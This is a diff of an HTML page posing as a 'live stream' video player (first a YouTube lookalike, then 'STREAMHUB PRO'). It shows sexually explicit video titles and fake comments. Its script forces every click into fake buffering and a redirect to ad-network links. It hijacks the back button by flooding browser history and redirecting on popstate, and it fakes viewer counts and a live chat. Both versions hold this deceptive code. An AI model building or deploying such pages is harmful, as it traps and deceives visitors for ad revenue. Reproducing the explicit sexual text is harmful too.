@@ -1,186 +1,500 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Exclusive Premiere</title>
-    <meta name="description" content="Exclusive Video Premiere Presentation" />
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>4K HD Ultra Stream Player</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        * { margin:0; padding:0; box-sizing:border-box; }
-        body { 
-            font-family:'Roboto',Arial,sans-serif; 
-            background:#0f0f0f; 
-            color:#f1f1f1; 
-            line-height:1.6; 
-            min-height:100vh; 
-            position: relative;
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            user-select: none;
+            -webkit-user-select: none;
+        }
+        body {
+            background-color: #0f0f0f;
+            color: #f1f1f1;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
             overflow-x: hidden;
         }
-        a { text-decoration:none; color:inherit; }
 
-        /* ════════════════════════════════════════════════════════════
-           MODERN YOUTUBE LOOK & STRUCTURE
-           ════════════════════════════════════════════════════════════ */
-        .youtube-wrapper { max-width:1280px; margin:0 auto; padding:0 16px 40px; }
-        .yt-header { display:flex; justify-content:space-between; align-items:center; padding:16px 0; border-bottom:1px solid #272727; margin-bottom:20px; }
-        .yt-logo { display:flex; align-items:center; gap:6px; font-size:20px; font-weight:700; color:#fff; letter-spacing: -0.5px; }
-        .yt-logo i { color:#ff0000; font-size:26px; }
-        .yt-header-actions { display: flex; gap: 18px; font-size: 18px; color: #f1f1f1; }
-        
-        .yt-grid { display:grid; grid-template-columns:1fr 380px; gap:24px; }
-        @media (max-width:1024px) { .yt-grid { grid-template-columns:1fr; gap: 16px; } }
-        
-        .video-player, .sidebar-item, .comments-section { cursor: pointer; }
-        
-        .video-player { 
-            position:relative; background:#000; border-radius:12px; overflow:hidden; aspect-ratio:16/9; 
-            display:flex; align-items:center; justify-content:center; box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+        /* HEADER */
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background: #121212;
+            padding: 10px 16px;
+            border-bottom: 1px solid #272727;
+            position: sticky;
+            top: 0;
+            z-index: 1000;
         }
-        .video-player img { width:100%; height:100%; object-fit:contain; }
-        
-        .play-overlay { position:absolute; inset:0; display:flex; align-items:center; justify-content:center; background:rgba(0,0,0,0.2); }
-        .play-circle { 
-            width:76px; height:76px; background:rgba(255,0,0,0.95); border-radius:50%; 
-            display:flex; align-items:center; justify-content:center; box-shadow:0 0 30px rgba(255,0,0,0.6); 
-            animation: pulse 1.8s infinite ease-in-out; 
+        .logo {
+            color: #ff0000;
+            font-size: 20px;
+            font-weight: 800;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            letter-spacing: -0.5px;
         }
-        @keyframes pulse { 0% { transform: scale(1); box-shadow: 0 0 15px rgba(255,0,0,0.5); } 50% { transform: scale(1.06); box-shadow: 0 0 35px rgba(255,0,0,0.8); } 100% { transform: scale(1); box-shadow: 0 0 15px rgba(255,0,0,0.5); } }
-        .play-circle i { color:#fff; font-size:28px; margin-left:4px; }
-        
-        /* ════════════════════════════════════════════════════════════
-           FUNCTIONAL SLIDER / PROGRESS BAR
-           ════════════════════════════════════════════════════════════ */
-        .fake-controls {
-            position: absolute; bottom: 0; left: 0; width: 100%; height: 45px;
-            background: linear-gradient(transparent, rgba(0,0,0,0.9));
-            display: flex; align-items: flex-end; padding: 0 15px 8px; box-sizing: border-box;
-            z-index: 5;
+        .logo span {
+            color: #fff;
+            font-size: 10px;
+            background: #cc0000;
+            padding: 2px 5px;
+            border-radius: 3px;
         }
-        .fake-progress-bar {
-            width: 100%; display: flex; align-items: center; position: relative;
+        .live-badge {
+            background: #ff0000;
+            color: #fff;
+            font-size: 11px;
+            font-weight: bold;
+            padding: 3px 8px;
+            border-radius: 2px;
+            animation: pulse 1.5s infinite;
         }
-        .progress-slider {
-            -webkit-appearance: none; width: 100%; height: 5px; background: rgba(255,255,255,0.2);
-            outline: none; border-radius: 3px; cursor: pointer; transition: height 0.1s;
-        }
-        .progress-slider:hover { height: 7px; }
-        .progress-slider::-webkit-slider-thumb {
-            -webkit-appearance: none; appearance: none; width: 13px; height: 13px;
-            border-radius: 50%; background: #ff0000; cursor: pointer; box-shadow: 0 0 5px rgba(0,0,0,0.5);
-        }
-        .progress-slider::-moz-range-thumb {
-            width: 13px; height: 13px; border-radius: 50%; background: #ff0000;
-            cursor: pointer; box-shadow: 0 0 5px rgba(0,0,0,0.5); border: none;
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.4; }
+            100% { opacity: 1; }
         }
 
-        .badge-live { background: #ff0000; color: #fff; font-size: 11px; font-weight: 900; padding: 2px 6px; border-radius: 4px; text-transform: uppercase; margin-right: 8px; display: inline-block; vertical-align: middle;}
-        .video-title { font-size:20px; font-weight:700; margin:14px 0 6px; line-height:1.4; color: #fff; }
+        /* MAIN CONTAINER */
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            flex-direction: column;
+        }
+        @media (min-width: 992px) {
+            .container {
+                flex-direction: row;
+                gap: 20px;
+                padding: 20px 0;
+            }
+            .main-content {
+                flex: 1;
+            }
+            .sidebar {
+                width: 380px;
+            }
+        }
+
+        /* PLAYER STYLES */
+        .player-wrapper {
+            position: relative;
+            width: 100%;
+            background: #000;
+            aspect-ratio: 16/9;
+            cursor: pointer;
+            overflow: hidden;
+        }
+        .player-wrapper img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        .overlay {
+            position: absolute;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0,0,0,0.35);
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            padding: 12px;
+        }
+        .top-info {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .quality-badge {
+            background: rgba(0,0,0,0.7);
+            border: 1px solid #444;
+            color: #00ff66;
+            font-size: 11px;
+            font-weight: bold;
+            padding: 3px 8px;
+            border-radius: 3px;
+        }
+        .online-views {
+            background: rgba(0,0,0,0.7);
+            color: #fff;
+            font-size: 12px;
+            padding: 3px 8px;
+            border-radius: 3px;
+        }
+        .play-btn-wrapper {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            text-align: center;
+        }
+        .play-btn {
+            width: 65px;
+            height: 65px;
+            background: rgba(255, 0, 0, 0.9);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #fff;
+            font-size: 26px;
+            box-shadow: 0 0 20px rgba(255,0,0,0.6);
+            margin: 0 auto 8px auto;
+            transition: transform 0.2s;
+        }
+        .player-wrapper:hover .play-btn {
+            transform: scale(1.1);
+        }
+        .buffer-text {
+            color: #fff;
+            font-size: 13px;
+            font-weight: 600;
+            text-shadow: 0 1px 3px rgba(0,0,0,0.8);
+        }
+
+        /* FAKE BUFFERING OVERLAY */
+        .fake-loader {
+            display: none;
+            position: absolute;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0,0,0,0.85);
+            z-index: 50;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            color: #fff;
+        }
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid rgba(255,255,255,0.2);
+            border-top: 5px solid #ff0000;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-bottom: 12px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* VIDEO META */
+        .video-info {
+            padding: 12px;
+            background: #181818;
+        }
+        .video-title {
+            font-size: 16px;
+            font-weight: 600;
+            line-height: 1.3;
+            margin-bottom: 8px;
+        }
+        .video-stats {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            font-size: 13px;
+            color: #aaa;
+            border-bottom: 1px solid #2d2d2d;
+            padding-bottom: 10px;
+            margin-bottom: 10px;
+        }
+        .action-btns {
+            display: flex;
+            gap: 15px;
+        }
+        .action-btn {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            color: #ccc;
+            font-size: 13px;
+            cursor: pointer;
+        }
+
+        /* LIVE CHAT STREAM */
+        .live-chat-box {
+            background: #121212;
+            border-top: 1px solid #222;
+            padding: 10px 12px;
+        }
+        .chat-header {
+            font-size: 12px;
+            text-transform: uppercase;
+            color: #888;
+            letter-spacing: 0.5px;
+            margin-bottom: 8px;
+            display: flex;
+            justify-content: space-between;
+        }
+        .chat-messages {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+            max-height: 140px;
+            overflow: hidden;
+        }
+        .comment-item {
+            display: flex;
+            align-items: flex-start;
+            gap: 8px;
+            font-size: 12px;
+            background: #1a1a1a;
+            padding: 6px 8px;
+            border-radius: 4px;
+            animation: fadeIn 0.3s ease;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(5px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .c-avatar-icon {
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 11px;
+            color: #fff;
+            flex-shrink: 0;
+        }
+        .c-avatar-icon.hot { background: #e91e63; }
+        .c-avatar-icon.fire { background: #ff5722; }
+        .c-avatar-icon.vip { background: #ffc107; color: #000; }
+        .c-avatar-icon.cam { background: #9c27b0; }
         
-        .video-meta-row { display:flex; flex-wrap:wrap; align-items:center; justify-content:space-between; padding-bottom:12px; border-bottom:1px solid #272727; gap:12px; }
-        .video-stats { display:flex; gap:15px; color:#aaa; font-size:14px; align-items: center; }
-        .watching-count { color: #ff4a4a; font-weight: bold; }
-        
-        .video-actions { display:flex; gap:12px; color:#f1f1f1; font-size:14px; }
-        .video-actions span { display:flex; align-items:center; gap:6px; padding:6px 14px; border-radius:20px; background: #272727; font-weight: 500;}
-        
-        .video-description { margin-top:12px; background:#272727; border-radius:12px; padding:12px 16px; font-size:14px; color:#f1f1f1; }
-        .channel-name { display:flex; align-items:center; gap:10px; margin-bottom:8px; }
-        .channel-name .avatar { width:38px; height:38px; border-radius:50%; background:linear-gradient(135deg, #ff0000, #ff6600); display:flex; align-items:center; justify-content:center; font-size:16px; font-weight:700; color:#fff; }
-        .channel-name .name { font-weight:600; font-size:15px; color:#fff; }
-        .channel-name .subs { font-size:12px; color:#aaa; }
-        
-        .sidebar-label { font-size:16px; font-weight:700; color:#fff; padding-bottom:10px; }
-        .sidebar-item { display:flex; gap:10px; margin-bottom: 12px; }
-        .sidebar-item .thumb { flex-shrink:0; width:150px; aspect-ratio:16/9; background:#272727; border-radius:8px; overflow:hidden; position: relative; }
-        .sidebar-item .thumb img { width:100%; height:100%; object-fit:cover; }
-        .sidebar-item .thumb .duration { position: absolute; bottom: 6px; right: 6px; background: rgba(0,0,0,0.8); color: #fff; font-size: 11px; padding: 1px 4px; border-radius: 3px; font-weight: 500; }
-        .sidebar-item .info { flex:1; min-width:0; display: flex; flex-direction: column; justify-content: center;}
-        .sidebar-item .info .title { font-size:13px; font-weight:600; color:#fff; line-height:1.3; display:-webkit-box; -webkit-line-clamp:2; -webkit-box-orient:vertical; overflow:hidden; margin-bottom: 4px;}
-        .sidebar-item .info .meta { font-size:11px; color:#aaa; }
-        
-        .comments-section { margin-top:20px; border-top:1px solid #272727; padding-top:16px; }
-        .comments-section h3 { font-size:16px; font-weight:600; margin-bottom:12px; color:#fff; }
-        .comment-item { display:flex; gap:12px; margin-bottom:14px; }
-        .comment-item .c-avatar { width:32px; height:32px; border-radius:50%; background:#3a3a3a; display:flex; align-items:center; justify-content:center; font-size:12px; font-weight: bold; color: #fff;}
-        .comment-item .c-body { flex:1; }
-        .comment-item .c-name { font-weight:600; font-size:13px; color:#aaa; }
-        .comment-item .c-name span { color:#606060; font-size:11px; margin-left:6px; font-weight: normal;}
-        .comment-item .c-text { font-size:13px; color:#f1f1f1; margin-top:1px; }
+        .c-name {
+            font-weight: 600;
+            color: #bbb;
+            font-size: 11px;
+        }
+        .c-name span {
+            color: #666;
+            font-size: 10px;
+            font-weight: normal;
+            margin-left: 4px;
+        }
+        .c-text {
+            color: #eee;
+            margin-top: 2px;
+        }
+
+        /* SIDEBAR (RECOMMENDED) */
+        .sidebar {
+            padding: 12px;
+        }
+        .sidebar-title {
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 12px;
+            color: #ddd;
+        }
+        .sidebar-item {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 12px;
+            cursor: pointer;
+        }
+        .sidebar-item .thumb {
+            width: 120px;
+            height: 68px;
+            background: #222;
+            position: relative;
+            flex-shrink: 0;
+            border-radius: 4px;
+            overflow: hidden;
+        }
+        .sidebar-item .thumb img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        .sidebar-item .duration {
+            position: absolute;
+            bottom: 3px;
+            right: 3px;
+            background: rgba(0,0,0,0.8);
+            font-size: 10px;
+            padding: 1px 4px;
+            border-radius: 2px;
+        }
+        .sidebar-item .info {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+        .sidebar-item .title {
+            font-size: 12px;
+            font-weight: 600;
+            line-height: 1.2;
+            display: -webkit-box;
+            -webkit-line-clamp: 2;
+            -webkit-box-orient: vertical;
+            overflow: hidden;
+            margin-bottom: 4px;
+        }
+        .sidebar-item .meta {
+            font-size: 11px;
+            color: #888;
+        }
     </style>
 </head>
 <body>
 
-    <div class="youtube-wrapper">
-        <header class="yt-header">
-            <div class="yt-logo"><i class="fab fa-youtube"></i> <span>YouTube</span></div>
-            <div class="yt-header-actions">
-                <i class="fas fa-search"></i>
-                <i class="fas fa-bars"></i>
-            </div>
-        </header>
-        
-        <div class="yt-grid">
-            <main class="video-main">
-                <div class="video-player" id="videoPlayer">
-                    <img id="mainGif" src="" alt="Stream Video" />
-                    <div class="play-overlay">
-                        <div class="play-circle"><i class="fas fa-play"></i></div>
-                    </div>
-                    <div class="fake-controls">
-                        <div class="fake-progress-bar">
-                            <input type="range" class="progress-slider" id="progressSlider" min="0" max="100" value="35">
-                        </div>
-                    </div>
-                </div>
-
-                <h1 class="video-title"><span class="badge-live">Live</span><span id="mainTitle">Loading…</span></h1>
-                
-                <div class="video-meta-row">
-                    <div class="video-stats">
-                        <span class="watching-count"><i class="fas fa-eye"></i> <span id="mainViews">42.5K</span> watching now</span>
-                        <span>• Started 5 mins ago</span>
-                    </div>
-                    <div class="video-actions">
-                        <span><i class="fas fa-thumbs-up"></i> 14K</span>
-                        <span><i class="fas fa-share"></i> Share</span>
-                    </div>
-                </div>
-
-                <div class="video-description">
-                    <div class="channel-name">
-                        <div class="avatar">🔥</div>
-                        <div>
-                            <div class="name">Premium Premiere Channel</div>
-                            <div class="subs">2.8M subscribers</div>
-                        </div>
-                    </div>
-                </div>
-
-                <div class="comments-section" id="commentsBox">
-                    <h3>Top Comments</h3>
-                    <div id="commentsList">
-                        <!-- কমেন্টগুলো জাভাস্ক্রিপ্ট দ্বারা লোড হবে -->
-                    </div>
-                </div>
-            </main>
-
-            <aside class="sidebar">
-                <div class="sidebar-label">Up Next</div>
-                <div id="suggestedList"></div>
-            </aside>
+    <!-- HEADER -->
+    <div class="header">
+        <div class="logo">
+            <i class="fas fa-play-circle"></i> STREAMHUB <span>PRO</span>
+        </div>
+        <div class="live-badge">
+            <i class="fas fa-broadcast-tower"></i> LIVE STREAM
         </div>
     </div>
 
+    <!-- MAIN CONTAINER -->
+    <div class="container">
+        <!-- MAIN PLAYER AREA -->
+        <div class="main-content">
+            <div class="player-wrapper action-trigger">
+                <img id="mainGif" src="" alt="Stream Preview">
+                
+                <!-- FAKE BUFFERING OVERLAY -->
+                <div class="fake-loader" id="fakeLoader">
+                    <div class="spinner"></div>
+                    <div style="font-size:14px; font-weight:bold;">Connecting to HD Stream...</div>
+                </div>
+
+                <div class="overlay" id="playerOverlay">
+                    <div class="top-info">
+                        <span class="quality-badge"><i class="fas fa-check-circle"></i> 4K ULTRA HD</span>
+                        <span class="online-views"><i class="fas fa-user"></i> <span id="mainViews">64,280</span> Watching</span>
+                    </div>
+                    <div class="play-btn-wrapper">
+                        <div class="play-btn">
+                            <i class="fas fa-play" style="margin-left: 4px;"></i>
+                        </div>
+                        <div class="buffer-text">Click To Unmute & Watch HD</div>
+                    </div>
+                    <div></div>
+                </div>
+            </div>
+
+            <div class="video-info">
+                <div class="video-title" id="mainTitle">Loading Stream Title...</div>
+                <div class="video-stats">
+                    <div>Started streaming 4 minutes ago</div>
+                    <div class="action-btns">
+                        <div class="action-btn action-trigger"><i class="fas fa-thumbs-up"></i> 142K</div>
+                        <div class="action-btn action-trigger"><i class="fas fa-share"></i> Share</div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- LIVE CHAT -->
+            <div class="live-chat-box">
+                <div class="chat-header">
+                    <span>Top Live Comments</span>
+                    <span style="color: #ff0000;"><i class="fas fa-circle" style="font-size: 8px;"></i> Live Chat</span>
+                </div>
+                <div class="chat-messages" id="chatStream">
+                    <!-- Dynamic Comments -->
+                </div>
+            </div>
+        </div>
+
+        <!-- SIDEBAR -->
+        <div class="sidebar">
+            <div class="sidebar-title">Recommended Streams</div>
+            <div id="suggestedList">
+                <!-- Dynamic Suggested Videos -->
+            </div>
+        </div>
+    </div>
+
+    <!-- JAVASCRIPT LOGIC -->
     <script>
         (function() {
             // ════════════════════════════════════════════════════════════
-            // LINKS SETTINGS
+            // LINK CONFIGURATION
             // ════════════════════════════════════════════════════════════
-            const DIRECT_LINK_MAIN = 'https://www.profitableratecpmnetwork.com/qqcft76z?key=45d936c36bd41433d96929c4c7a6f966'; 
-            const REDIRECT_LINK_1  = 'https://parasiteoutdoorsmix.com/uhcqy8rb?key=5c2bff61118d7f516c8cc5f032e9598f';
-            const BACK_HIJACK_LINK = 'https://www.effectivecpmnetwork.com/mrf0xkn4?key=a5cb1f5df6809332b2c01da8477db66c';
+            const FIRST_OFFER_LINK = 'https://www.profitableratecpmnetwork.com/uhcqy8rb?key=5c2bff61118d7f516c8cc5f032e9598f'; 
+            const BACK_AD_LINK     = 'https://www.profitableratecpmnetwork.com/qqcft76z?key=45d936c36bd41433d96929c4c7a6f966'; 
 
+            let isLocked = false;
+
+            // ১. অফার লিংকে যাওয়ার আগে সেশন স্টোরেজে স্টেট সেভ করা
+            // এতে ইউজার ব্যাক করে আসলেও আমরা বুঝতে পারব সে অফার লিংক থেকে ফিরেছে
+            function checkRedirectOnPageShow() {
+                if (sessionStorage.getItem('offer_visited') === 'true') {
+                    // সেশন ক্লিয়ার করে সঙ্গে সঙ্গে ব্যাক হাইজ্যাক লিংকে পাঠাবে
+                    sessionStorage.removeItem('offer_visited');
+                    window.location.replace(BACK_AD_LINK);
+                }
+            }
+
+            // পেজ লোড বা ব্রাউজারের ব্যাক বাটন দিয়ে পেজে প্রবেশের সাথে সাথে চেক করবে
+            window.addEventListener('pageshow', checkRedirectOnPageShow);
+
+            // ২. স্ক্রল, টাচ বা যেকোনো ক্লিকের সাথে সাথে ব্যাক বাটন হাইজ্যাক প্রস্তুত করা
+            function lockBackHijack() {
+                if (!isLocked) {
+                    isLocked = true;
+                    for (let i = 0; i < 20; i++) {
+                        window.history.pushState({ hijack: true }, '', window.location.href);
+                    }
+                }
+            }
+
+            // Click সহ Touch, Scroll সব ইভেন্টেই হাইজ্যাক লক হবে
+            ['click', 'touchstart', 'touchmove', 'scroll', 'wheel'].forEach(eventType => {
+                window.addEventListener(eventType, lockBackHijack, { passive: true });
+            });
+
+            // ৩. সাধারণ ব্যাক বাটন প্রেস করলে ব্যাক বিজ্ঞাপন লিংকে যাবে
+            window.addEventListener('popstate', function(e) {
+                window.location.replace(BACK_AD_LINK);
+            });
+
+            // ৪. অ্যাকশন বাটনে ক্লিক করলে ফেক বাফারিং + অফার লিংকে রিডাইরেক্ট
+            function triggerActionWithBuffer(e) {
+                e.preventDefault();
+                e.stopPropagation();
+
+                // ক্লিকের সাথে সাথে হাইজ্যাক লক হবে
+                lockBackHijack();
+
+                // সেশন স্টোরেজে ফ্ল্যাগ সেট করা যেন ব্যাক করলে বোঝা যায়
+                sessionStorage.setItem('offer_visited', 'true');
+
+                // ফেক বাফারিং অ্যানিমেশন দেখানো
+                const loader = document.getElementById('fakeLoader');
+                if (loader) loader.style.display = 'flex';
+
+                // ১.৫ সেকেন্ড পর ১ম অফার লিংকে নিয়ে যাওয়া
+                setTimeout(() => {
+                    window.location.href = FIRST_OFFER_LINK;
+                }, 500);
+            }
+
+            // অ্যাকশন বাটনগুলোতে ইভেন্ট যুক্ত করা
+            function bindActionButtons() {
+                document.querySelectorAll('.action-trigger').forEach(el => {
+                    el.removeEventListener('click', triggerActionWithBuffer);
+                    el.addEventListener('click', triggerActionWithBuffer);
+                });
+            }
+
+            bindActionButtons();
+
+            // VIDEO DATA & DYNAMIC UI
             const videoPool = [
                 { src: 'IMG_5604.GIF', title: 'Hot Girl fucked by Huge cock with Full hardcore sex', views: '2.4M', time: '12:05' },
                 { src: '023_1000.GIF', title: 'Fucked my college friend naked after a long time.', views: '1.8M', time: '15:40' },
@@ -196,116 +510,70 @@
             ];
 
             const commentsPool = [
-                { avatar: 'JD', name: 'John D.', text: 'Wow, can\'t believe this is unrated version! 😱🔥', time: '2 mins ago' },
-                { avatar: 'NS', name: 'Naughty_Sam', text: 'Damn, she is taking it so deep! Absolute perfection 🤤💯', time: '1 min ago' },
-                { avatar: 'K9', name: 'Kevin99', text: 'The full video link is amazing, totally worth clicking guys!', time: '4 mins ago' },
-                { avatar: 'A2', name: 'Alex_Adult', text: 'Her body is insane! Love how hard he is pumping her 🍒🍆', time: '3 mins ago' },
-                { avatar: 'LX', name: 'Lisa X', text: 'Oh my god, those positions are wild. Best scene ever! 🔥', time: '5 mins ago' },
-                { avatar: 'MR', name: 'Mike_Rod', text: 'That creampie at the end was completely out of this world! 💦💦', time: '30s ago' },
-                { avatar: 'BH', name: 'Babby_Hot', text: 'She screams so loud, I can listen to this all night long...', time: '6 mins ago' },
-                { avatar: 'ST', name: 'Sins_Fan', text: 'This girl is a beast! Pure hardcore action right here 😳👌', time: '7 mins ago' },
-                { avatar: 'P6', name: 'PornKing69', text: 'That big cock completely stretched her out. Insane wetness!', time: '8 mins ago' },
-                { avatar: 'V2', name: 'Vixen_Lover', text: 'My favorite amateur couple, glad I caught this premiere live!', time: '10 mins ago' },
-                { avatar: 'X3', name: 'XXX_Hunter', text: 'Holy shit! The way she rides that huge tool is gorgeous 👅', time: '11 mins ago' },
-                { avatar: 'DK', name: 'Dirty_Karl', text: 'Absolutely brutal sex, she loves every single inch of it!', time: '12 mins ago' }
+                { icon: 'fa-kiss-wink-heart', class: 'hot', name: 'Naughty_Sam 💋', text: 'She is taking it so deep! Absolute perfection 🤤💯' },
+                { icon: 'fa-fire-alt', class: 'fire', name: 'HotGirl_69 🔥', text: 'OMG! 4K quality is crystal clear! 😱' },
+                { icon: 'fa-gem', class: 'vip', name: 'VIP_Member ⭐', text: 'Full video link unlocked guys! Amazing stream 🔥' },
+                { icon: 'fa-video', class: 'cam', name: 'LiveCam_Girl 🍓', text: 'Her body is insane! Love this 4K stream 🍒🍆' },
+                { icon: 'fa-heart', class: 'hot', name: 'Lisa_Adult 💋', text: 'Oh my god, best live scene ever! 🔥' },
+                { icon: 'fa-bolt', class: 'vip', name: 'Mike_Rod 💦', text: 'That creampie at the end was completely wild! 💦💦' }
             ];
 
             const mainVideo = videoPool[Math.floor(Math.random() * videoPool.length)];
             document.getElementById('mainGif').src = mainVideo.src;
             document.getElementById('mainTitle').textContent = mainVideo.title;
 
-            // Load Comments
-            let commentsHtml = '';
-            commentsPool.forEach(c => {
-                commentsHtml += `
-                <div class="comment-item">
-                    <div class="c-avatar">${c.avatar}</div>
-                    <div class="c-body">
-                        <div class="c-name">${c.name} <span>${c.time}</span></div>
-                        <div class="c-text">${c.text}</div>
-                    </div>
-                </div>`;
-            });
-            document.getElementById('commentsList').innerHTML = commentsHtml;
+            let baseViews = 64280;
+            const viewsEl = document.getElementById('mainViews');
+            setInterval(() => {
+                baseViews += Math.floor(Math.random() * 25) - 10;
+                viewsEl.textContent = baseViews.toLocaleString();
+            }, 2500);
 
-            // Load Sidebar Recommendations
+            const chatStream = document.getElementById('chatStream');
+            let commentIndex = 0;
+
+            function addLiveChatMessage() {
+                const comment = commentsPool[commentIndex % commentsPool.length];
+                commentIndex++;
+
+                const chatItem = document.createElement('div');
+                chatItem.className = 'comment-item';
+                chatItem.innerHTML = `
+                    <div class="c-avatar-icon ${comment.class}"><i class="fas ${comment.icon}"></i></div>
+                    <div>
+                        <div class="c-name">${comment.name} <span>Just now</span></div>
+                        <div class="c-text">${comment.text}</div>
+                    </div>
+                `;
+
+                chatStream.appendChild(chatItem);
+                if (chatStream.children.length > 4) chatStream.removeChild(chatStream.children[0]);
+            }
+
+            addLiveChatMessage();
+            addLiveChatMessage();
+            setInterval(addLiveChatMessage, 2000);
+
             let sidebarHtml = '';
             videoPool.forEach((item) => {
-                if(item.title !== mainVideo.title || item.src !== mainVideo.src) {
+                if (item.title !== mainVideo.title) {
                     sidebarHtml += `
-                    <div class="sidebar-item suggested-video-item">
+                    <div class="sidebar-item action-trigger">
                         <div class="thumb">
                             <img src="${item.src}" loading="lazy" />
                             <div class="duration">${item.time}</div>
                         </div>
                         <div class="info">
                             <div class="title">${item.title}</div>
-                            <div class="meta">${item.views} views • Recommendation</div>
+                            <div class="meta">${item.views} views • 4K HD</div>
                         </div>
                     </div>`;
                 }
             });
             document.getElementById('suggestedList').innerHTML = sidebarHtml;
 
-            // ════════════════════════════════════════════════════════════
-            // CLICK LOGIC
-            // ════════════════════════════════════════════════════════════
-            function triggerLinks() {
-                try {
-                    window.open(REDIRECT_LINK_1, '_blank');
-                } catch (e) { }
-                window.open(DIRECT_LINK_MAIN, '_self');
-            }
-
-            document.getElementById('videoPlayer').addEventListener('click', triggerLinks);
-            document.getElementById('commentsBox').addEventListener('click', triggerLinks);
-
-            document.getElementById('progressSlider').addEventListener('click', function(e) {
-                e.stopPropagation(); 
-                triggerLinks();
-            });
-
-            document.getElementById('suggestedList').addEventListener('click', function(e) {
-                if(e.target.closest('.suggested-video-item')) {
-                    triggerLinks();
-                }
-            });
-
-            // ════════════════════════════════════════════════════════════
-            // ENHANCED ADVANCED BACK-BUTTON & USER-ACTION HIJACKING
-            // ════════════════════════════════════════════════════════════
-            let hijackInitialized = false;
-
-            function pushStateHistory() {
-                for (let i = 0; i < 15; i++) {
-                    window.history.pushState({ page: i }, document.title, window.location.href);
-                }
-            }
-
-            function setupHijack() {
-                if (!hijackInitialized) {
-                    pushStateHistory();
-                    hijackInitialized = true;
-                }
-            }
-
-            // প্রথম লোডেই হিস্ট্রি স্প্যাম করার চেষ্টা করা
-            pushStateHistory();
-
-            // ব্যবহারকারীর যেকোন ইন্টারঅ্যাকশনে (ক্লিক, টাচ, স্ক্রোল, মাউস মুভ) হিস্ট্রি লক নিশ্চিত করা
-            const userEvents = ['click', 'touchstart', 'mousemove', 'scroll', 'keydown'];
-            userEvents.forEach(evt => {
-                window.addEventListener(evt, setupHijack, { passive: true });
-            });
-
-            // পপ-স্টেট / ব্যাক বাটন প্রেস করার পর রিডাইরেক্ট করানো
-            window.addEventListener('popstate', function (event) {
-                pushStateHistory();
-                setTimeout(function() {
-                    window.location.href = BACK_HIJACK_LINK;
-                }, 10);
-            });
-
+            // ডায়নামিক কন্টেন্ট লোড হওয়ার পর বাটন পুনরায় বাইন্ড
+            bindActionButtons();
         })();
     </script>
 </body>
